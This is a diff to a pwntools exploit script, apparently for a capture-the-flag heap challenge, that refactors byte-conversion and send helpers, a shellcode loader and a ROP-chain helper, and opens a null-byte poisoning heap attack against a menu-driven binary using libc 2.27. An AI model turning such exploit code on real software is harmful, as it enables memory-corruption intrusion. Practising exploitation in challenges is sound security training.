@@ -1,22 +1,48 @@
 from pwn import *
 import time
 import subprocess
-from functools import reduce
 
+
+#transforms an integer to bytes with the minimum number of bytes possible
+def int2bytes(num: int, adjust=8) -> bytes:
+    return num.to_bytes((num.bit_length() + 7) // 8, byteorder='little', signed=True if num < 0 else False).ljust(adjust, b"\x00")
+
+# this function checks if the input is any of: str, int or bytes and returns the bytes conversion
+# otherwise it raises an exception
+# (if input is bytes they are return unchanged)
+def any2bytes(datum):
+    if isinstance(datum, str):
+        return datum.encode()
+    elif isinstance(datum, int):
+        return int2bytes(datum)
+    elif isinstance(datum, bytes):
+        return datum
+    else:
+        raise TypeError("any2bytes: datum provided is neither str, int or bytes object")
+
+# converts data to bytes and send
+# data can also be an array
 def send(r, data):
-    r.sendline(data)
-    time.sleep(0.1)
+    result=b""
+    if isinstance(data, list):
+        for datum in data:
+            result += any2bytes(datum)
+    else:
+        result = any2bytes(data)
+    r.sendline(result)
+    time.sleep(0.05)
+
 
 def print_red(str):
-	print("\033[91m" + str + "\033[0m")
+    print("\033[91m" + str + "\033[0m")
 
 def genbin(binary_name):
-	command = f"genbin ~/challenges/playroom/shellcodes/{binary_name}"
-	try:
-		return bytes.fromhex(subprocess.check_output(command, shell=True, universal_newlines=True))
-	except (subprocess.CalledProcessError, ValueError) as e:
-		print(f"An exception occurred: {e}")
-		exit(-1)
+    command = f"genbin ~/challenges/playroom/shellcodes/{binary_name}"
+    try:
+        return bytes.fromhex(subprocess.check_output(command, shell=True, universal_newlines=True))
+    except (subprocess.CalledProcessError, ValueError) as e:
+        print(f"An exception occurred: {e}")
+        exit(-1)
 
 def rop_chain(chain):     
     for i in range(len(chain)):
@@ -30,23 +56,14 @@ def add_pkm(r):
     send(r, b"0")
 
 
-#data is an array of stirngs or bytes
 def rename_pkm(r, index, data, length):
-    result=b""
-    for elem in data:
-        if isinstance(elem, str):
-            result += elem.encode()
-        elif isinstance(elem, bytes):
-            result += elem
-        else:
-            throw("beccato")
     #r.clean()
     send(r, b"1")
     r.recvuntil(b"> ")
     send(r, str(index).encode())
     r.recvuntil(b"length: ")
     send(r, str(length).encode())
-    send(r, result)
+    send(r, data)
 
 def kill_pkm(r, index):
     #r.clean()
@@ -96,7 +113,7 @@ UNKNOWN = 0x402036
 LIBC = ELF("./libc-2.27_notcache.so")
 
 # NULL BYTE POISONING ATTACK
-time.sleep(0.2)
+time.sleep(0.3)
 add_pkm(r)                                      #PKM1
 add_pkm(r)                                      #PKM2
 add_pkm(r)                                      #PKM3
